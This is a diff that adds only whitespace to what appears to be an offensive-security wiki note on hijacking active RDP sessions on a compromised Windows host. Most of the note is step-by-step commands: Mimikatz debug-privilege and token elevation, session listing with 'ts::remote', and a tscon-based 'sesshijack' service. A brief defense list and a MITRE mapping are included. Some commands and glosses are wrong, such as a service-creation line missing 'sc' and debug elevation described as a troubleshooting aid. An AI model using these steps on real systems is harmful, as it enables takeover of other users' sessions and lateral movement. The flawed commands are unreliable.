@@ -42,11 +42,15 @@ Technical Explanation: Attackers can use Mimikatz to dump credentials from the m
 
 Business Value: Attackers can use this technique to gain access to sensitive data and systems that are only accessible through a compromised RDP session. This can lead to data theft, system compromise, and financial loss for the targeted organization.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised Windows host
 
 1. Mimikatz tool
+
+ 
 
 ## Defense
 
@@ -56,6 +60,8 @@ Business Value: Attackers can use this technique to gain access to sensitive dat
 
 1. Restrict network access to only authorized users and systems
 
+ 
+
 ## Objectives
 
 1. Take over an active RDP session on a compromised Windows host
@@ -64,14 +70,24 @@ Business Value: Attackers can use this technique to gain access to sensitive dat
 
 1. Move laterally within the network
 
+ 
+
 # Instructions
 
 1. To enable debug privileges, run the following command:
 
+ 
+
+
+
 **Code**: [[privilege::debug 
 token::elevate ]]
 
+
+
 > This command grants the process the ability to debug other processes and access their memory. The privilege::debug argument specifies the debug privilege and token::elevate argument elevates the process token to allow the privilege to be enabled. This command is useful for troubleshooting and debugging applications.
+
+
 
 **Command** ([[Debug Privilege Elevated]]):
 
@@ -80,11 +96,21 @@ privilege::debug
 token::elevate
 ```
 
+
+
 2. Use the ts::sessions command to list all Remote Desktop Protocol (RDP) sessions currently active on the system.
+
+ 
+
+
 
 **Code**: [[ts::sessions]]
 
+
+
 > This command provides information about each RDP session, including the session ID, user name, session state, and client name. It is useful for monitoring active RDP sessions and troubleshooting issues related to remote access.
+
+
 
 **Command** ([[List active sessions]]):
 
@@ -92,11 +118,21 @@ token::elevate
 ts::sessions
 ```
 
+
+
 3. This command is used to hijack a remote session on a Windows system. The /id argument specifies the ID of the session that you want to hijack.
+
+ 
+
+
 
 **Code**: [[ts::remote /id:2]]
 
+
+
 > Remote session hijacking can be used by attackers to take control of a user's session on a remote system. This can be done by exploiting vulnerabilities in the Remote Desktop Protocol (RDP) or by stealing session tokens. It is important to use this command ethically and only in controlled environments for testing purposes.
+
+
 
 **Command** ([[Connect to Remote Server with ID 2]]):
 
@@ -104,9 +140,17 @@ ts::sessions
 ts::remote /id:2
 ```
 
+
+
 4. tscon.exe is a command line utility that can be used to connect to a remote desktop session on a terminal server.
 
+ 
+
+
+
 **Code**: [[tscon.exe]]
+
+
 
 > To use tscon.exe, you will need to provide the session ID of the remote desktop session you want to connect to. The session ID can be obtained using the 'query session' command. The syntax for the tscon.exe command is as follows:
 
@@ -122,10 +166,18 @@ ts::remote /id:2
 2. Run the 'create sesshijack binpath="cmd.exe /k tscon 1 /dest:rdp-tcp#55"' command to create a sesshijack service with the specified binary path and Session ID.
 3. Run the 'net start sesshijack' command to start the sesshijack service.
 
+ 
+
+
+
 **Code**: [[# get the Session ID you want to hijack
 query user]]
 
+
+
 > The 'query user' command is used to get a list of user sessions on a remote server. The 'create sesshijack' command is used to create a new service named 'sesshijack' with the specified binary path and Session ID to hijack. The 'net start sesshijack' command is used to start the sesshijack service and hijack the specified Session ID.
+
+
 
 **Command** ([[Query Session ID]]):
 
@@ -133,17 +185,27 @@ query user]]
 query user
 ```
 
+
+
+
+
 **Command** ([[Create Session Hijack]]):
 
 ```bash
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 ```
 
+
+
+
+
 **Command** ([[Start Session Hijack]]):
 
 ```bash
 net start sesshijack
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -174,3 +236,5 @@ net start sesshijack
 
 - [[RDP Session Takeover]]
 - [[Windows - Mimikatz]]
+
+
